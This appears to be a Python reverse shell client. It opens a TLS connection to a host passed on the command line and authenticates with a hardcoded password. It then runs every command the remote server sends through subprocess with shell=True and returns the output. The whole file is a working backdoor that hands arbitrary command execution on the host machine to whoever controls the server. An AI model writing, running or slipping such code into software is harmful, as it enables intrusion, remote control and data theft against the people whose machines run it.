import sys
import ssl
import socket
import subprocess

SERVER_HOST = sys.argv[1]
SERVER_PORT = 8000
PASSWORD = "secret123"

context = ssl.create_default_context()
with socket.create_connection((SERVER_HOST, SERVER_PORT)) as sock:
    with context.wrap_socket(sock, server_hostname=SERVER_HOST) as ssock:
        ssock.send(PASSWORD.encode())
        response = ssock.recv(1024).decode()
        if response != "OK":
            print("Authentication failed")
            exit()

        print("Connected securely. Awaiting commands...")
        while True:
            command = ssock.recv(4064).decode()
            if command == "exit":
                break

            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                output = result.stdout + result.stderr
            except Exception as e:
                output = f"Error executing command: {e}"

            ssock.send(output.encode())
